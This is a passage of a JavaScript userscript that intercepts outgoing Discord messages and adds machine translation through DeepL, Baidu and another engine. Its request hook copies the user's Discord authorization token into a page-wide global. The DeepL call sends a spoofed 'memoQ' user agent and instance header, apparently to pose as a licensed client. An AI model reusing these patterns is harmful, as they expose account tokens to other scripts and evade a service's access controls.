                        "request_id": "demo",
                        "detect": false,
                    }),
                    onload: function(responseDetails) {
                        try {
                            console.warn(responseDetails);
                            var result = JSON.parse(responseDetails.response);
                            callback(result.target);
                        } catch(e) {
                            callback("");
                            console.error(e);
                        }
                    },
                    "headers": {
                        "Content-type": "application/json",
                        'x-authorization': "token " + GMDiscordTrsOpt.GMDiscordTrsApiKey
                    },
                    onerror: function(error) {
                        console.error(error);
                    }
                });
            },
            DeepL: function(text, callback) {
                var langPars = ['JA', 'ZH', 'EN', 'AUTO', 'ES', 'ZH', 'PT'];
                var preArg = "ignore_tags=trsIgnoretag&tag_handling=xml&source_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang] + "&target_lang=" + langPars[GMDiscordTrsOpt.GMDiscordTrsToLang] + "&preserve_formatting=0&auth_key=" + GMDiscordTrsOpt.GMDiscordTrsApiKey;
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: "https://api.deepl.com/v1/translate",
                    data: preArg + "&text=" + encodeURIComponent(text),
                    onload: function(responseDetails) {
                        try {
                            //console.warn(responseDetails);
                            var result = JSON.parse(responseDetails.response);
                            callback(result.translations[0].text);
                        } catch(e) {
                            callback("");
                            console.error(e);
                        }
                    },
                    "headers": {
                        "User-Agent": "memoQ",
                        "Accept": "*/*",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Content-type": "application/x-www-form-urlencoded",
                        "X-Instance": "QzBDQTdCRjNGODREQAAZ0VBNzTTXTRCRUFFMTgwMEUyMDMAAfxQTlBMTIyQjA0MDgwRTM5ODxxsazQTdGRA=="
                    },
                    onerror: function(error) {
                        console.error(error);
                    }
                });
            },
            Baidu: function(text, callback) {
                var langPars = ['jp', 'zh', 'en', 'auto', 'spa', 'zh', 'pt'];
                var appid = GMDiscordTrsOpt.GMDiscordTrsAppId;
                var key = GMDiscordTrsOpt.GMDiscordTrsApiKey;
                var salt = "125637";
                var str1 = appid + text + salt + key;
                var sign = md5(str1).toLowerCase();
                var query = "q=" + encodeURIComponent(text) + "&appid=" + encodeURIComponent(appid) + "&salt=" + encodeURIComponent(salt) + "&from=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsFromLang]) + "&to=" + encodeURIComponent(langPars[GMDiscordTrsOpt.GMDiscordTrsToLang]) + "&sign=" + encodeURIComponent(sign);
                GM_xmlhttpRequest({
                    method: 'POST',
                    url: 'https://api.fanyi.baidu.com/api/trans/vip/translate',
                    data: query,
                    onload: function(responseDetails) {
                        try {
                            //console.warn(responseDetails);
                            var result = JSON.parse(responseDetails.response);
                            var rText = "";
                            for (var i = 0; i < result.trans_result.length; i++) {
                                if (i > 0) {
                                    rText += "\r\n";
                                }
                                rText += result.trans_result[i].dst;
                            }
                            callback(rText);
                        } catch(e) {
                            callback("");
                            console.error(e);
                        }
                    },
                    "headers": {
                        "accept": "*/*",
                        "accept-language": "zh-CN,zh;q=0.9,ja-JP;q=0.8,ja;q=0.7,en;q=0.6,eo;q=0.5",
                        "cache-control": "no-cache",
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    onerror: function(error) {
                        console.error(error);
                    }
                });
            }
        };
        GMDiscordTrsOpt.GMDiscordTrsEngine = (Object.keys(engineFuncs).indexOf(GM_getValue('GMDiscordTrsEngine')) !== -1) ? GM_getValue('GMDiscordTrsEngine') : "Google";
        GMDiscordTrsOpt.GMDiscordTrsEngineLast = GMDiscordTrsOpt.GMDiscordTrsEngine;
        (function() {
            'use strict';
            unsafeWindow.eval(hookAjax);

            unsafeWindow.hookAjax({
                setRequestHeader: function(arg, xhr) {
                    if (arg[0] == "Authorization") {
                        //为其他脚本设置的这个....你可以干掉它.
                        unsafeWindow.userToken = arg[1];
                    }
                },
                open: function(args, xhr) {
                    xhr.url = args[1]
                    return false;
                },
                send: function(args, xhr) {
                    if (!GMDiscordTrsOpt.GMDiscordTrsOn || GMDiscordTrsOpt.GMDiscordTrsToLang === GMDiscordTrsOpt.GMDiscordTrsFromLang) {
                        return false;
                    }
                    if (xhr.url.match(/https:\/\/discord.com\/api\/v\d+\/channels\/\d+\/messages/)) {
                        if (args[0]) {
                            if (xhr.fixed) {
                                return false;
                            }
                            xhr.fixed = true;
                            try{
                                //debugger;
                                var msg = JSON.parse(args[0]);
                                if (msg.content && msg.content.length > 1) {
                                    var cb = (function(msg, xhr) {
                                        return function(text) {
                                            if(text !== ""){
                                                if(GMDiscordTrsOpt.GMDiscordTrsShowEngine){
                                                    text = GMDiscordTrsOpt.GMDiscordTrsEngine + ": " + text;
                                                }
                                                if(GMDiscordTrsOpt.GMDiscordTrsToLang === 5){
                                                    text = s2t(text);
                                                }
                                                if(GMDiscordTrsOpt.GMDiscordTrsToLang === 1){
                                                    text = t2s(text);
                                                }
                                                if(msg.content && msg.content !== text){
                                                    if (GMDiscordTrsOpt.GMDiscordTrsOnlyDist) {
                                                        msg.content = text;
                                                    } else {
                                                        msg.content = msg.content + GMDiscordTrsOpt.GMDiscordTrssplitStrDef + text;
                                                    }
                                                }
                                            }
                                            xhr.send(JSON.stringify(msg));
                                        }
                                    })(msg, xhr);
                                    if((GMDiscordTrsOpt.GMDiscordTrsToLang === 5 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 1) || (GMDiscordTrsOpt.GMDiscordTrsToLang === 1 && GMDiscordTrsOpt.GMDiscordTrsFromLang === 5)){
                                        setTimeout((function(cb,text){
                                            cb(text);
                                        })(cb,msg.content),10);
                                        return true;
                                    }
                                    engineFuncs[GMDiscordTrsOpt.GMDiscordTrsEngine](msg.content, cb);
                                    return true;
                                }
                            } catch(e) {
                                console.error(e);
                            }
                            return false;
                        }
                    }
                    return false;
                }
            });

            function appendLangTrsSelect(fromSelAppendTo, toSelAppendTo) {
                var fromSel = document.createElement('Select');
                var toSel = document.createElement('Select');
                for (var i = 0; i < langCodes.length; i++) {
                    if (i === 3) {
                        continue;
                    }
                    var fromOpt = document.createElement('Option');
                    var toOpt = document.createElement('Option');
                    fromOpt.innerText = langCodes[i];
                    fromOpt.value = i.toString();
                    fromSel.appendChild(fromOpt);
                    if (i !== 3) { //"自动检测/AutoDetect"
                        toOpt.innerText = langCodes[i];
                        toOpt.value = i.toString();
                        toSel.appendChild(toOpt);
                    }
                }
                fromSel.value = GMDiscordTrsOpt.GMDiscordTrsFromLang.toString();
                toSel.value = GMDiscordTrsOpt.GMDiscordTrsToLang.toString();
                fromSel.onchange = function(ev) {
                    GMDiscordTrsOpt.GMDiscordTrsFromLang = this.value * 1;
                    GM_setValue('GMDiscordTrsFromLang', this.value * 1);
                }
                toSel.onchange = function(ev) {
                    GMDiscordTrsOpt.GMDiscordTrsToLang = this.value * 1;
                    GM_setValue('GMDiscordTrsToLang', this.value * 1);
                }
                fromSelAppendTo.appendChild(fromSel);
                toSelAppendTo.appendChild(toSel);
            }

            function addTextInputGMSet(name, getValWrapFunc, setValWrapFunc, hide) {
                var inputTrs = document.createElement("input");
                inputTrs.type = "text";
                if (hide) {
                    inputTrs.style.backgroundColor = "#fff";
                    inputTrs.style.color = "#fff";
                }
                var gvar = GMDiscordTrsOpt[name];
                if (getValWrapFunc) {
                    gvar = getValWrapFunc(gvar);
                }
                inputTrs.value = gvar;
                var EvFunc = (function(name, getValWrapFunc, setValWrapFunc) {
                    return function() {
                        var val = this.value;
                        if (setValWrapFunc) {
                            val = setValWrapFunc(val);
                        }
                        GMDiscordTrsOpt[name] = val;
                        GM_setValue(name, val);
                    }
                })(name, getValWrapFunc, setValWrapFunc);
                inputTrs.onchange = EvFunc;
                inputTrs.onkeydown = EvFunc;
                if (hide) {
                    inputTrs.onfocus = function() {
                        this.style.color = "#000";
                    }
                    inputTrs.onblur = function() {
                        this.style.color = "#fff";
                    }
                }
                return inputTrs;
            }
            function addCheckBoxInputGMSet(name, getValWrapFunc, setValWrapFunc) {
                var inputTrs = document.createElement("input");
                inputTrs.type = "checkbox";
                var gvar = GMDiscordTrsOpt[name];
                if (getValWrapFunc) {
                    gvar = getValWrapFunc(gvar);
                }
                inputTrs.checked = gvar;
                var EvFunc = (function(name) {
                    return function() {
                        var val = this.checked;
                        if (getValWrapFunc) {
                            val = setValWrapFunc(val);
                        }
                        GMDiscordTrsOpt[name] = val;
                        GM_setValue(name, val);
                    }
                })(name);
                inputTrs.onchange = EvFunc;
                return inputTrs;
            }
            function toggleOptions() {
                var CHackDiscordTrsToolOptionDiv = document.getElementById('CHackDiscordTrsToolOptionDiv');
                if (CHackDiscordTrsToolOptionDiv) {
                    CHackDiscordTrsToolOptionDiv.remove();
                    return;
                }
                //var computedStyleAppMount = document.defaultView.getComputedStyle(document.getElementById('app-mount'));
                //var computedStyleHeader = document.defaultView.getComputedStyle(document.querySelector('header[class^=header]'));

                var wrap = document.createElement("div");
                wrap.id = "CHackDiscordTrsToolOptionDiv";
                wrap.style = "position: fixed;display: inline-block;background-color: var(--background-secondary);color: var(--interactive-active);z-index: 999999999;right: 1em;top: 3em;padding: 1em;border-radius: 1em;box-shadow: 0 0 4px #000;";

                wrap.insertAdjacentHTML('beforeend', "<br>Global Switch: ");
                wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOn'));

                wrap.insertAdjacentHTML('beforeend', "<br>Only Send Dest Lang: ");
                wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsOnlyDist'));

                wrap.insertAdjacentHTML('beforeend', "<br>Show Engine In Msg: ");
                wrap.insertAdjacentElement('beforeend', addCheckBoxInputGMSet('GMDiscordTrsShowEngine'));
                var inputSplit = addTextInputGMSet("GMDiscordTrssplitStrDef",
                                                   function(val) {
                    val = JSON.stringify(val);
                    val = val.substr(1, val.length - 2);
                    return val;
                },
                                                   function(val) {
                    return JSON.parse('"' + val.replace(/"/g, '\"') + '"');
                });

                wrap.insertAdjacentHTML('beforeend', "<br>Split for Src / Dst text: ");
                wrap.insertAdjacentElement('beforeend', inputSplit);

                wrap.insertAdjacentHTML('beforeend', "<br>ApiKey: ");
                wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsApiKey", undefined, undefined, true));

                wrap.insertAdjacentHTML('beforeend', "<br>AppId: ");
                wrap.insertAdjacentElement('beforeend', addTextInputGMSet("GMDiscordTrsAppId", undefined, undefined, true));
                wrap.insertAdjacentHTML('beforeend', "(If needed)");

                wrap.insertAdjacentHTML('beforeend', "<br> Engine: ");
                Object.keys(engineFuncs).forEach(function(e) {
                    var inputTrsEngine = document.createElement("input");
                    inputTrsEngine.type = "radio";
                    inputTrsEngine.name = "TrsEnging";
                    inputTrsEngine.checked = GMDiscordTrsOpt.GMDiscordTrsEngine === e;
                    inputTrsEngine.onchange = (function(e) {
                        return function() {
                            GMDiscordTrsOpt.GMDiscordTrsEngine = e;
                            GM_setValue('GMDiscordTrsEngine', e);
                            GM_setValue('GMDiscordTrsEngineAppKey_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsApiKey);
                            GM_setValue('GMDiscordTrsEngineAppId_' + GMDiscordTrsOpt.GMDiscordTrsEngineLast, GMDiscordTrsOpt.GMDiscordTrsAppId);
                            var appk = GM_getValue('GMDiscordTrsEngineAppKey_' + e);
                            var appi = GM_getValue('GMDiscordTrsEngineAppId_' + e);
                            if (appk) {
                                GM_setValue('GMDiscordTrsApiKey', appk);
                                GMDiscordTrsOpt.GMDiscordTrsApiKey = appk;
                            } else {
                                GM_setValue('GMDiscordTrsApiKey', "");
                                GMDiscordTrsOpt.GMDiscordTrsApiKey = "";
                            }
                            if (appi) {
                                GM_setValue('GMDiscordTrsAppId', appi);
                                GMDiscordTrsOpt.GMDiscordTrsAppId = appi;
                            } else {
                                GM_setValue('GMDiscordTrsAppId', "");
                                GMDiscordTrsOpt.GMDiscordTrsAppId = "";
                            }
                            GMDiscordTrsOpt.GMDiscordTrsEngineLast = e;
                            toggleOptions();
                            toggleOptions();
                        }
                    })(e);
                    wrap.insertAdjacentElement('beforeend', inputTrsEngine);
                    wrap.insertAdjacentHTML('beforeend', " " + e + " ");
                });

                wrap.insertAdjacentHTML('beforeend', "<br> ");
                var fromSpan = document.createElement("span");
                var toSpan = document.createElement("span");
                fromSpan.innerText = "Src Lang: ";
                toSpan.innerText = "Dst Lang: ";
                appendLangTrsSelect(fromSpan, toSpan);
                wrap.insertAdjacentElement('beforeend', fromSpan);
                wrap.insertAdjacentElement('beforeend', toSpan);
                document.body.insertAdjacentElement('beforeend', wrap);
            }

            setInterval(function() {
                var target = document.querySelector('a[href="https://support.discord.com"]');
                if (target) {
                    target.onclick = function(ev) {
                        ev.preventDefault();
                        ev.stopImmediatePropagation();
                        ev.stopPropagation();
                        toggleOptions();
                    }
                }
            },
                        100);
        })();
    })})()
